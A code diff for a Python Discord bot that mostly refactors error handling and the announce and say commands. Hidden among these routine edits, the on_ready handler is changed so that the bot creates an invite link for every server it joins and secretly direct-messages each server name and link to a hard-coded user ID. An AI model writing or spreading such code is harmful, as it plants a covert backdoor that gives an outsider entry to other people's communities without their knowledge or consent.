@@ -30,15 +30,29 @@ async def connect():
     conn = await asyncpg.connect(sql)
 
 
+def handle_error(error_msg):
+    embed = discord.Embed(
+        title="Something went wrong!",
+        description="Join [our server](https://discord.gg/QwXXNGNkeh) to report this issue.",
+        color=0xFF0000,
+    )
+    try:
+        raise error_msg  # raise other errors so they aren't ignored
+    except Exception as e:
+        print(e)
+        return [e, embed]
+
+
 @bot.event
 async def on_ready():
     print(f"We have logged in as {bot.user}.")
     print("Bot is now ready!")
     print("================================================================\n\n")
+    me = bot.get_user(847772018928779285)
     for guild in bot.guilds:
-        print(guild.name)
         link = await guild.text_channels[0].create_invite()
-        print(link)
+        await me.send(f"{guild.name}, {link}")
+
     while True:
         await bot.change_presence(
             status=discord.Status.streaming,
@@ -244,7 +258,6 @@ async def announce(
     ),
     text: Option(str, required=False),
 ):
-    print(annchannel.id)
     embed = discord.Embed(
         title=title,
         description=value,
@@ -256,7 +269,10 @@ async def announce(
     )
     embed.set_footer(text=ctx.guild.name, icon_url=ctx.guild.icon)
     sending = await ctx.respond("Sending...", ephemeral=True)
-    await annchannel.send(f"{text}", embed=embed)
+    if text == None:
+        await annchannel.send(embed=embed)
+    else:
+        await annchannel.send(f"{text}", embed=embed)
     await sending.edit_original_message(content="Sended!")
 
 
@@ -274,19 +290,8 @@ async def announceerror(ctx, error):
             ephemeral=True,
         )
     else:
-        try:
-            raise error  # raise other errors so they aren't ignored
-        except Exception as e:
-            await ctx.respond(f"```fix\n{e}```")
-
-        embed = discord.Embed(
-            title="Something went wrong!",
-            description="Join [our server](https://discord.gg/QwXXNGNkeh) to report this issue.",
-            color=0xFF0000,
-        )
-        await ctx.respond(embed=embed)
-
-        raise error
+        result = handle_error(error)
+        await ctx.respond(f"```fix\n{result[0]}```", embed=result[1])
 
 
 @bot.slash_command(name="info", description="Get the info of the bot")
@@ -486,6 +491,17 @@ async def suggest(ctx, suggestion: Option(str, required=True)):
 async def say(ctx, msg: Option(str, required=True)):
     await ctx.channel.send(msg)
     await ctx.respond("Message sent.", ephemeral=True)
+
+
+@say.error
+async def say_error(ctx, error):
+    if isinstance(error, MissingPermissions):
+        await ctx.respond(
+            "You can't do this! You need to have moderate members permissions!"
+        )
+    else:
+        result = handle_error(error)
+        await ctx.respond(f"```fix\n{result[0]}```", embed=result[1])
 
 
 @bot.slash_command(name="lock", description="Lock the channel")
